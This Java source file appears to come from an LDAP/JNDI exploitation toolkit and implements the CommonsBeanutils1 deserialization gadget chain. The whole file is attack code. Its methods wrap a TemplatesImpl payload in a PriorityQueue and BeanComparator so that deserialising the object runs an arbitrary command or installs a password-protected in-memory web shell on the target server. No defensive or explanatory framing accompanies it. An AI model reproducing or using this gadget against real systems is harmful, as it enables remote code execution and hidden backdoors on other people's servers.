package com.idiot9.ldap.gadgets;

import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

public class CommonsBeanutils1 implements GadgetFactory{

    @Override
    public Object getCmdObject(String cmd) throws Exception {
        Templates templates = (Templates) TemplatesCreator.createTemplatesImpl(cmd);
        return getGadget(templates);
    }

    @Override
    public Object getMemObject(String mem, String password) throws Exception {
        Templates templates = TemplatesCreator.MemShell.createMemTemplates(mem, password);
        return getGadget(templates);
    }

    @Override
    public Object getGadget(Templates templates) throws Exception {
        BeanComparator<Object> comparator = new BeanComparator<>();
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }
}
